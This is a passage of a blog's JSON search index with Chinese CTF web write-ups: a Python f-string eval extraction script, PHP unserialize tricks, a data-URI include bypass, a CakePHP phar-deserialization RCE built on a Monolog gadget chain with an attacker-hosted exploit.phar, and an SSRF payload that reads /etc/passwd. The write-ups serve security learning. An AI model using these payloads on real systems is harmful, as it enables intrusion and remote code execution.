print(&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;) print(&#x27;&gt;&gt;&gt;&gt; print(&#x27;+escape(calc_eval)+&#x27;)&#x27;) try: result = str(eval(calc_eval)) if result.isdigit() or result == &#x27;True&#x27; or result == &#x27;False&#x27;: print(result) else: print(&quot;Invalid&quot;) # Sorry we don&#x27;t support output as a string due to security issue. except: print(&quot;Invalid&quot;) print(&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;) op 也会被 blacklist 过滤一遍，不能使用’了，目前也没有什么好用的方法继续绕过了。注意到一件事，题目用的 Python 版本为 Python3，会不会有什么特别的功能了？确实有，f-string。f-string 里可以引入判断，所以思路要换一下：Tru 通过 value1 输出，而 e 通过条件判断。就是要构造 f’{FLAG&gt;source or “e” }’，当 FLAG&gt;source 时输出 1，否则输出 e。那么脚本就很好写了，稍微改一下： 123456789101112131415161718192021222324import requestsimport urllibimport stringurl=&quot;http://192.168.60.131/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;flag=&quot;&quot;source=&quot;&quot;value1=urllib.parse.quote(&quot;T&quot;)op=urllib.parse.quote(&quot;+f&quot;)value2=urllib.parse.quote(&quot;ru&#123;FLAG&gt;source or 14:x&#125;&quot;)while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if &quot;True&quot; in result and &quot;security&quot; not in result: flag+=chr(prev-1) print(flag) break else: prev=i flag{5b6e26f3-ad46-4165-9f55-7766c3bb2fff}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"f-string","slug":"f-string","permalink":"http://tiaonmmn.github.io/tags/f-string/"}]},{"title":"35C3CTF-php","slug":"35C3CTF-php","date":"2019-05-15T07:05:04.000Z","updated":"2019-12-10T12:15:12.577Z","comments":true,"path":"2019/05/15/35C3CTF-php/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/35C3CTF-php/","excerpt":"","text":"1234567891011121314151617181920&lt;!-- more --&gt;&lt;?php$line = trim(fgets(STDIN));$flag = file_get_contents(&#x27;/flag&#x27;);class B &#123; function __destruct() &#123; global $flag; echo $flag; &#125;&#125;$a = @unserialize($line);throw new Exception(&#x27;Well that was unexpected!&#x27;);echo $a;?&gt; 原以为 PHP 里一个类的__destruct 方法在程序结束时自动调用，结果不是。unserialize 反序列化一个类后，如果变量个数对应不上的话，会直接销毁原有的类，调用__destruct 方法。这个题就很简单了，让 unserialize 出错就行了。serialize(new B()) 后返回 O:1:”B”:0:{}，class B 里没有任何内部变量，因此 0:{}，我们改成任意值，即可让其报错。O:1:”B”:1:{} 就可以了。__destruct 方法自动调用。 flag{b6b31fd1-4e2f-4a50-82af-21290dc253ec}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"}]},{"title":"Insomni-hack-teaser-2019-Phuck2","slug":"Insomni-hack-teaser-2019-Phuck2","date":"2019-05-15T06:56:49.000Z","updated":"2019-12-10T12:15:12.666Z","comments":true,"path":"2019/05/15/Insomni-hack-teaser-2019-Phuck2/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-Phuck2/","excerpt":"今天继续学习 PHP 知识。Insomni hacker’s teaser 2019 的 Phuck2，题目比较简单，顺便学习了一下 Data URI Scheme。环境在这里。","text":"今天继续学习 PHP 知识。Insomni hacker’s teaser 2019 的 Phuck2，题目比较简单，顺便学习了一下 Data URI Scheme。环境在这里。 123456789101112131415161718192021222324252627&lt;?php stream_wrapper_unregister(&#x27;php&#x27;); if(isset($_GET[&#x27;hl&#x27;])) highlight_file(__FILE__); $mkdir = function($dir) &#123; system(&#x27;mkdir -- &#x27;.escapeshellarg($dir)); &#125;; $randFolder = bin2hex(random_bytes(16)); $mkdir(&#x27;users/&#x27;.$randFolder); chdir(&#x27;users/&#x27;.$randFolder); $userFolder = (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]) ? $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] : $_SERVER[&#x27;REMOTE_ADDR&#x27;]); $userFolder = basename(str_replace([&#x27;.&#x27;,&#x27;-&#x27;],[&#x27;&#x27;,&#x27;&#x27;],$userFolder)); $mkdir($userFolder); chdir($userFolder); file_put_contents(&#x27;profile&#x27;,print_r($_SERVER,true)); chdir(&#x27;..&#x27;); $_GET[&#x27;page&#x27;]=str_replace(&#x27;.&#x27;,&#x27;&#x27;,$_GET[&#x27;page&#x27;]); if(!stripos(file_get_contents($_GET[&#x27;page&#x27;]),&#x27;&lt;?&#x27;) &amp;&amp; !stripos(file_get_contents($_GET[&#x27;page&#x27;]),&#x27;php&#x27;)) &#123; include($_GET[&#x27;page&#x27;]); &#125; chdir(__DIR__); system(&#x27;rm -rf users/&#x27;.$randFolder);?&gt; 上来先 ban 了 php 流，猜一下是文件包含的题。$mkdir 函数用的 system 函数调用 mkdir 命令，看起来有搞头，但是后面的 escapeshellarg 没法绕，暂时作罢。每个用户新建独立目录并切进去。下面的 $userFolder 开始有趣了，从 X-Forwarded-For 头里拿目录名字作为 userFolder，并且过滤. 和 - 这两个符号。file_put_contents 令人眼前一亮，把 $_SERVER 的所有数据写到 userFolder/profile 里，并且完全没有过滤，那么我们随便捏造一个 HTTP 头，传入任意 PHP 代码，可以造成 RCE。而后面的 include 印证了我们的想法。但是 include 的内容有点问题，不能出现 &lt;? 和 php，因此我们没办法直接传 page=XXX/profile。后面给出的 phpinfo.php 提示我们 allow_url_fopen 为 On，而 allow_url_include 为 Off，就没有办法直接传了。 后来发现 include 与 file_get_contents 在关于 Data URI 处理问题上的问题。include () 与 file_get_contents () 支持 data:，注意不是 data:// 流，是 data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh 这种东西。Data URI 在网页中其实经常见到，data:image/jpeg;base64,XXXXX 经常内嵌在网页中直接传输图片。话说回来，file_get_contents 与 include 在处理 data:, 时具有某些奇怪的特性。 file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 include data URI 的，但是如果 data:,XXX 是一个目录名的话，就会放开限制。所以使用这个绕过。 flag{d12dce31-43b4-45ef-8bed-ddede1045228}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Data URI Scheme","slug":"Data-URI-Scheme","permalink":"http://tiaonmmn.github.io/tags/Data-URI-Scheme/"}]},{"title":"HITCON2018-BabyCake","slug":"HITCON2018-BabyCake","date":"2019-05-15T06:42:10.000Z","updated":"2020-03-05T07:18:53.441Z","comments":true,"path":"2019/05/15/HITCON2018-BabyCake/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/15/HITCON2018-BabyCake/","excerpt":"花了几天时间搞明白一道题，放环境有点晚。 源码审计的题，跟 SSRF 无关。用的 CakePHP 框架，PHP7.2 版本的。打开页面后让我们输入 URL，但又不是 SSRF，反序列化？猜不到，看源码吧。","text":"花了几天时间搞明白一道题，放环境有点晚。 源码审计的题，跟 SSRF 无关。用的 CakePHP 框架，PHP7.2 版本的。打开页面后让我们输入 URL，但又不是 SSRF，反序列化？猜不到，看源码吧。 # Part 1.Look inside the code,and LFI. 重点代码在 src.php 里。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;?phpnamespace App\\Controller;use Cake\\Core\\Configure;use Cake\\Http\\Client;use Cake\\Http\\Exception\\ForbiddenException;use Cake\\Http\\Exception\\NotFoundException;use Cake\\View\\Exception\\MissingTemplateException;class DymmyResponse &#123; function __construct($headers, $body) &#123; $this-&gt;headers = $headers; $this-&gt;body = $body; &#125;&#125;class PagesController extends AppController &#123; private function httpclient($method, $url, $headers, $data) &#123; $options = [ &#x27;headers&#x27; =&gt; $headers, &#x27;timeout&#x27; =&gt; 10 ]; $http = new Client(); return $http-&gt;$method($url, $data, $options); &#125; private function back() &#123; return $this-&gt;render(&#x27;pages&#x27;); &#125; private function _cache_dir($key)&#123; $ip = $this-&gt;request-&gt;getEnv(&#x27;REMOTE_ADDR&#x27;); $index = sprintf(&#x27;mycache/%s/%s/&#x27;, $ip, $key); return CACHE . $index; &#125; private function cache_set($key, $response) &#123; $cache_dir = $this-&gt;_cache_dir($key); if ( !file_exists($cache_dir) ) &#123; mkdir($cache_dir, 0700, true); file_put_contents($cache_dir . &quot;body.cache&quot;, $response-&gt;body); file_put_contents($cache_dir . &quot;headers.cache&quot;, serialize($response-&gt;headers)); &#125; &#125; private function cache_get($key) &#123; $cache_dir = $this-&gt;_cache_dir($key); if (file_exists($cache_dir)) &#123; $body = file_get_contents($cache_dir . &quot;/body.cache&quot;); $headers = file_get_contents($cache_dir . &quot;/headers.cache&quot;); $body = &quot;&lt;!-- from cache --&gt;\\n&quot; . $body; $headers = unserialize($headers); return new DymmyResponse($headers, $body); &#125; else &#123; return null; &#125; &#125; public function display(...$path) &#123; $request = $this-&gt;request; $data = $request-&gt;getQuery(&#x27;data&#x27;); $url = $request-&gt;getQuery(&#x27;url&#x27;); if (strlen($url) == 0) return $this-&gt;back(); $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) ); if (strlen($scheme) == 0 || !in_array($scheme, [&#x27;http&#x27;, &#x27;https&#x27;])) return $this-&gt;back(); $method = strtolower( $request-&gt;getMethod() ); if ( !in_array($method, [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;delete&#x27;, &#x27;patch&#x27;]) ) return $this-&gt;back(); $headers = []; foreach ($request-&gt;getHeaders() as $key =&gt; $value) &#123; if (in_array( strtolower($key), [&#x27;host&#x27;, &#x27;connection&#x27;, &#x27;expect&#x27;, &#x27;content-length&#x27;] )) continue; if (count($value) == 0) continue; $headers[$key] = $value[0]; &#125; $key = md5($url); if ($method == &#x27;get&#x27;) &#123; $response = $this-&gt;cache_get($key); if (!$response) &#123; $response = $this-&gt;httpclient($method, $url, $headers, null); $this-&gt;cache_set($key, $response); &#125; &#125; else &#123; $response = $this-&gt;httpclient($method, $url, $headers, $data); &#125; foreach ($response-&gt;headers as $key =&gt; $value) &#123; if (strtolower($key) == &#x27;content-type&#x27;) &#123; $this-&gt;response-&gt;type(array(&#x27;type&#x27; =&gt; $value)); $this-&gt;response-&gt;type(&#x27;type&#x27;); continue; &#125; $this-&gt;response-&gt;withHeader($key, $value); &#125; $this-&gt;response-&gt;body($response-&gt;body); return $this-&gt;response; &#125;&#125; 很明显，允许我们输入的 URL 只能是 HTTP 或 HTTPS 协议的，然后根据访问题目页面的 HTTP 方式去，通过一个 httpclient 来对输入 URL 进行访问。如果使用的是 GET 方式，会设置缓存。同时，访问题目页面时的 HTTP 头也会同时发送到 httpclient 中。 然后我们该看啥？从来没有源码审计的经验，没思路。既然我们请求的 URL 是通过 httpclient 实现的，看一下 Httpclient 吧。在这之前，我们注意到在用 GET 请求的时候，会进行缓存操作，而这个缓存是自定义的。在 cache_get () 里，$header 有一个 unserialize 操作，有点可疑，而且是用的 file_get_contents () 读的缓存。同样的，cache_set () 里会对 $response 返回的 headers 序列化，用 file_put_contents () 写的缓存。暂时不知道这两处怎么利用。 跟进 Httpclient，这是一个对 Client 类的封装。来到 vendor/cakephp/cakephp/src/Http/Client.php 里。__construct 方法貌似没什么好玩的，就是对 Cookie 的操作。主要是 public function post ($url, $data = [], array $options = []) 这个函数，先 buildUrl，然后_doRequests 发送。buildUrl 没什么意思，对输入的 URL 处理一下。而_doRequests () 先是调用_createRequest ()，然后 send ()。跟进_createRequest ()，前面进行头处理，后面 new 一个 Request 对象。跟进，来到 vendor/cakephp/cakephp/src/Http/Client/Request.php。__construct () 设置了 Connection 和 User-Agent 头后调用 body () 函数处理 $data。而 $data 使用 FormData-&gt;addMany () 处理。跟进 addMany ()，来到 vendor/cakephp/cakephp/src/Http/Client/FormData.php。addMany () 函数就是将 $data 数组逐项喂给 add () 函数，重点来了。 12345678910111213141516171819202122public function add($name, $value = null)&#123; if (is_array($value)) &#123; $this-&gt;addRecursive($name, $value); &#125; elseif (is_resource($value)) &#123; $this-&gt;addFile($name, $value); &#125; elseif (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[0] === &#x27;@&#x27;) &#123; trigger_error( &#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27; . &#x27;Instead you should use file handles.&#x27;, E_USER_DEPRECATED ); $this-&gt;addFile($name, $value); &#125; elseif ($name instanceof FormDataPart &amp;&amp; $value === null) &#123; $this-&gt;_hasComplexPart = true; $this-&gt;_parts[] = $name; &#125; else &#123; $this-&gt;_parts[] = $this-&gt;newPart($name, $value); &#125; return $this;&#125; 第 8 行的判断很有问题，如果 $value 首字符为 @，会 trigger_error ()，然后 addFile ()。trigger_error () 不会停止执行，下面看 addFile ()。 123456789101112131415161718192021222324252627282930public function addFile($name, $value)&#123; $this-&gt;_hasFile = true; $filename = false; $contentType = &#x27;application/octet-stream&#x27;; if (is_resource($value)) &#123; $content = stream_get_contents($value); if (stream_is_local($value)) &#123; $finfo = new finfo(FILEINFO_MIME); $metadata = stream_get_meta_data($value); $contentType = $finfo-&gt;file($metadata[&#x27;uri&#x27;]); $filename = basename($metadata[&#x27;uri&#x27;]); &#125; &#125; else &#123; $finfo = new finfo(FILEINFO_MIME); $value = substr($value, 1); $filename = basename($value); $content = file_get_contents($value); $contentType = $finfo-&gt;file($value); &#125; $part = $this-&gt;newPart($name, $content); $part-&gt;type($contentType); if ($filename) &#123; $part-&gt;filename($filename); &#125; $this-&gt;add($part); return $part;&#125; \\(value 没有任何过滤，直接 file_get_contents (\\)value)，然后返回到 $part。因此这里有一处 LFI。然后我们能干什么呢？ Part 2.LFI to RCE. 2018 年特别火的一个考点就是 phar:// 的反序列化漏洞问题。而 file_get_contents 确实也可以造成反序列化。那么本题解题思路出来了： 首先需要一台 VPS。利用请求将恶意 phar 文件保存在 cache 中。 然后发出 POST 请求，最终使 file_get_contents () 触发 cache 中的 phar RCE。 思路明确了，但是我们要找一个能够触发反序列化漏洞的点。这时不妨回去看看 composer.json。其中 monolog/monolog 这个包有点引人注意，它曾经确实的出现过反序列化漏洞，去找一下信息，题目所安装的版本也确实存在这个漏洞。那么直接写这个 Payload 就好了。Github 上有。构造如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpnamespace Monolog\\Handler&#123; class SyslogUdpHandler &#123; protected $socket; function __construct($x) &#123; $this-&gt;socket = $x; &#125; &#125; class BufferHandler &#123; protected $handler; protected $bufferSize = -1; protected $buffer; # ($record[&#x27;level&#x27;] &lt; $this-&gt;level) == false protected $level = null; protected $initialized = true; # ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false protected $bufferLimit = -1; protected $processors; function __construct($methods, $command) &#123; $this-&gt;processors = $methods; $this-&gt;buffer = [$command]; $this-&gt;handler = clone $this; &#125; &#125;&#125;namespace&#123; $cmd = &quot;ls -alt&quot;; //Modify here. $obj = new \\Monolog\\Handler\\SyslogUdpHandler( new \\Monolog\\Handler\\BufferHandler( [&#x27;current&#x27;, &#x27;system&#x27;], [$cmd, &#x27;level&#x27; =&gt; null] ) ); $phar = new Phar(&#x27;exploit.phar&#x27;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&#x27;test&#x27;, &#x27;test&#x27;); $phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;); $phar-&gt;setMetadata($obj); $phar-&gt;stopBuffering();&#125; 将生成的 exploit.phar 放到服务器上，然后在题目页面上进行如下操作： A[&quot;使用 GET 方式访问 http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&#x2F;exploit.phar&quot;] --&gt; B B[&quot;使用 POST 方式访问 &#96;http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&amp;data[test\\]&#x3D;@phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;tmp&#x2F;cache&#x2F;mycache&#x2F;CLIENT_IP&#x2F;MD5(http:&#x2F;&#x2F;IP&#x2F;exploit.phar)&#x2F;body.cache&quot;] 这样就可以 Getshell 了。 flag{851489de-10d6-450b-b8f9-479bfd2e4dd5}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"CakePHP","slug":"CakePHP","permalink":"http://tiaonmmn.github.io/tags/CakePHP/"}]},{"title":"FireShell2019-Vice","slug":"FireShell2019-Vice","date":"2019-05-14T13:07:07.000Z","updated":"2019-12-10T12:15:12.610Z","comments":true,"path":"2019/05/14/FireShell2019-Vice/","link":"","permalink":"http://tiaonmmn.github.io/2019/05/14/FireShell2019-Vice/","excerpt":"快过年了，拖了几天。环境在这。 题目不难，直接给了源码。","text":"快过年了，拖了几天。环境在这。 题目不难，直接给了源码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//require_once &#x27;/app/public/config.php&#x27;;class SHITS&#123; private $url; private $method; private $addr; private $host; private $name; function __construct($method,$url)&#123; $this-&gt;method = $method; $this-&gt;url = $url; &#125; function doit()&#123; $this-&gt;host = @parse_url($this-&gt;url)[&#x27;host&#x27;]; $this-&gt;addr = @gethostbyname($this-&gt;host); $this-&gt;name = @gethostbyaddr($this-&gt;host); if($this-&gt;addr !== &quot;127.0.0.1&quot; || $this-&gt;name === false)&#123; $not = [&#x27;.txt&#x27;,&#x27;.php&#x27;,&#x27;.xml&#x27;,&#x27;.html&#x27;,&#x27;.&#x27;,&#x27;[&#x27;,&#x27;]&#x27;]; foreach($not as $ext)&#123; $p = strpos($this-&gt;url,$ext); if($p)&#123; die(&quot;:)&quot;); &#125; &#125; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$this-&gt;url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $result = curl_exec($ch); echo $result; &#125;else&#123; die(&quot;:)&quot;); &#125; &#125; function __destruct()&#123; if(in_array($this-&gt;method,array(&quot;doit&quot;)))&#123; call_user_func_array(array($this,$this-&gt;method),array()); &#125;else&#123; die(&quot;:)&quot;); &#125; &#125;&#125;if(isset($_GET[&quot;gg&quot;])) &#123; @unserialize($_GET[&quot;gg&quot;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 看到 unserialize，猜到是个反序列化的题了。开头的 require，以及下面的 curl，目测是反序列化导致 SSRF。__destruct 方法提示，我们需要给 method 赋值 doit，不能跳出到其它函数。然后看 doit，如果传入的 url 不是以 127.0.0.1 做 Host，并且不出现.txt、.php、.xml、.html、.、[、] 这其中之一。注意他用的是 strpos () 判断。然后使用 curl 访问，并显示结果。 首先我们需要有一个能够运行的反序列化模板。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php//require_once &#x27;/app/public/config.php&#x27;;class SHITS&#123; private $url; private $method; private $addr; private $host; private $name; function __construct($method,$url)&#123; $this-&gt;method = $method; $this-&gt;url = $url; &#125; function doit()&#123; kan$this-&gt;host = @parse_url($this-&gt;url)[&#x27;host&#x27;]; $this-&gt;addr = @gethostbyname($this-&gt;host); $this-&gt;name = @gethostbyaddr($this-&gt;host); if($this-&gt;addr !== &quot;127.0.0.1&quot; || $this-&gt;name === false)&#123; $not = [&#x27;.txt&#x27;,&#x27;.php&#x27;,&#x27;.xml&#x27;,&#x27;.html&#x27;,&#x27;.&#x27;,&#x27;[&#x27;,&#x27;]&#x27;]; foreach($not as $ext)&#123; $p = strpos($this-&gt;url,$ext); if($p)&#123; die(&quot;:)&quot;); &#125; &#125; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$this-&gt;url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $result = curl_exec($ch); echo $result; &#125;else&#123; die(&quot;:)&quot;); &#125; &#125; function __destruct()&#123; if(in_array($this-&gt;method,array(&quot;doit&quot;)))&#123; call_user_func_array(array($this,$this-&gt;method),array()); &#125;else&#123; die(&quot;:)&quot;); &#125; &#125;&#125;$a=new SHITS(&quot;doit&quot;,&quot;file:///etc/passwd&quot;);print(serialize($a));?&gt; 运行即可出结果。正常情况下应该可以读 /etc/passwd 文件了。下面要绕过黑名单了。搜了一下，Google php strpos bypass，出了一个 CVE。两次编码即可。那么我们就需要对. 两次编码。. 的编码为 %2e，对 % 编码为 %25，那么我们应该写文件名为 config%252ephp。而路径题目已经提示了 /app/public。 重点来了，正常 serialize 后应该是如下结果：O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fapp%2Fpublic%2Fconfig.%252570hp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D（URL 编码过了）。这个结果在其他 Writeup 上没什么问题，我本地测试的时候问题大了。正常的浏览器没有把我们的 %25 解析了，这就造成字符串数量错了。正确的序列化结果应为 &#123;s:10:%22%00SHITS%00url%22;s:31:%22file:///app/public/config%252ephp%22;s:13:%22%00SHITS%00method%22;s:4:%22doit%22;s:11:%22%00SHITS%00addr%22;N;s:11:%22%00SHITS%00host%22;N;s:11:%22%00SHITS%00name%22;N;&#125;'。%25 应该已经在访问的时候就 URL Decode 的，但是序列化的时候没有考虑这点，因此我们要手动扣除。 flag{ecf6df95-a28a-42ae-8b2b-43e9065d1e7f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]}],"categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"},{"name":"Logs","slug":"Logs","permalink":"http://tiaonmmn.github.io/categories/Logs/"},{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/categories/Misc/"},{"name":"Something else","slug":"Something-else","permalink":"http://tiaonmmn.github.io/categories/Something-else/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Hack","slug":"Hack","permalink":"http://tiaonmmn.github.io/tags/Hack/"},{"name":"RCE","slug":"RCE","permalink":"http://tiaonmmn.github.io/tags/RCE/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"XXE","slug":"XXE","permalink":"http://tiaonmmn.github.io/tags/XXE/"},{"name":"SVG","slug":"SVG","permalink":"http://tiaonmmn.github.io/tags/SVG/"},{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"},{"name":"sql_mode","slug":"sql-mode","permalink":"http://tiaonmmn.github.io/tags/sql-mode/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Redis","slug":"Redis","permalink":"http://tiaonmmn.github.io/tags/Redis/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"},{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"},{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"},{"name":"Nginx","slug":"Nginx","permalink":"http://tiaonmmn.github.io/tags/Nginx/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"},{"name":"原型链污染","slug":"原型链污染","permalink":"http://tiaonmmn.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"CTFd","slug":"CTFd","permalink":"http://tiaonmmn.github.io/tags/CTFd/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"},{"name":"Pickle","slug":"Pickle","permalink":"http://tiaonmmn.github.io/tags/Pickle/"},{"name":"ASP.NET","slug":"ASP-NET","permalink":"http://tiaonmmn.github.io/tags/ASP-NET/"},{"name":"Pipe","slug":"Pipe","permalink":"http://tiaonmmn.github.io/tags/Pipe/"},{"name":"二次注入","slug":"二次注入","permalink":"http://tiaonmmn.github.io/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"name":"异或注入","slug":"异或注入","permalink":"http://tiaonmmn.github.io/tags/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/"},{"name":"盲注","slug":"盲注","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"},{"name":".user.ini","slug":"user-ini","permalink":"http://tiaonmmn.github.io/tags/user-ini/"},{"name":"Upload","slug":"Upload","permalink":"http://tiaonmmn.github.io/tags/Upload/"},{"name":"Crypto","slug":"Crypto","permalink":"http://tiaonmmn.github.io/tags/Crypto/"},{"name":"ECB","slug":"ECB","permalink":"http://tiaonmmn.github.io/tags/ECB/"},{"name":"Python.Flask","slug":"Python-Flask","permalink":"http://tiaonmmn.github.io/tags/Python-Flask/"},{"name":"Cookie","slug":"Cookie","permalink":"http://tiaonmmn.github.io/tags/Cookie/"},{"name":"LFI","slug":"LFI","permalink":"http://tiaonmmn.github.io/tags/LFI/"},{"name":"Unicode","slug":"Unicode","permalink":"http://tiaonmmn.github.io/tags/Unicode/"},{"name":"JSON","slug":"JSON","permalink":"http://tiaonmmn.github.io/tags/JSON/"},{"name":"addslashes","slug":"addslashes","permalink":"http://tiaonmmn.github.io/tags/addslashes/"},{"name":"PHP_SESSION_UPLOAD_PROGRESS","slug":"PHP-SESSION-UPLOAD-PROGRESS","permalink":"http://tiaonmmn.github.io/tags/PHP-SESSION-UPLOAD-PROGRESS/"},{"name":"Configuration","slug":"Configuration","permalink":"http://tiaonmmn.github.io/tags/Configuration/"},{"name":"Perl","slug":"Perl","permalink":"http://tiaonmmn.github.io/tags/Perl/"},{"name":"CGI","slug":"CGI","permalink":"http://tiaonmmn.github.io/tags/CGI/"},{"name":"Acunetix","slug":"Acunetix","permalink":"http://tiaonmmn.github.io/tags/Acunetix/"},{"name":"FFI","slug":"FFI","permalink":"http://tiaonmmn.github.io/tags/FFI/"},{"name":"SoapClient","slug":"SoapClient","permalink":"http://tiaonmmn.github.io/tags/SoapClient/"},{"name":"Slepp","slug":"Slepp","permalink":"http://tiaonmmn.github.io/tags/Slepp/"},{"name":"哈希扩展攻击","slug":"哈希扩展攻击","permalink":"http://tiaonmmn.github.io/tags/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"},{"name":"Cherrypy","slug":"Cherrypy","permalink":"http://tiaonmmn.github.io/tags/Cherrypy/"},{"name":"CVE-2016-5699","slug":"CVE-2016-5699","permalink":"http://tiaonmmn.github.io/tags/CVE-2016-5699/"},{"name":"CRLF Injection","slug":"CRLF-Injection","permalink":"http://tiaonmmn.github.io/tags/CRLF-Injection/"},{"name":"MT19937","slug":"MT19937","permalink":"http://tiaonmmn.github.io/tags/MT19937/"},{"name":"SSTI","slug":"SSTI","permalink":"http://tiaonmmn.github.io/tags/SSTI/"},{"name":"Shell","slug":"Shell","permalink":"http://tiaonmmn.github.io/tags/Shell/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"http://tiaonmmn.github.io/tags/PHP-FPM/"},{"name":"RSync","slug":"RSync","permalink":"http://tiaonmmn.github.io/tags/RSync/"},{"name":"escapeshellarg","slug":"escapeshellarg","permalink":"http://tiaonmmn.github.io/tags/escapeshellarg/"},{"name":"escapeshellcmd","slug":"escapeshellcmd","permalink":"http://tiaonmmn.github.io/tags/escapeshellcmd/"},{"name":"命令注入","slug":"命令注入","permalink":"http://tiaonmmn.github.io/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"},{"name":"Forensic","slug":"Forensic","permalink":"http://tiaonmmn.github.io/tags/Forensic/"},{"name":"Windows","slug":"Windows","permalink":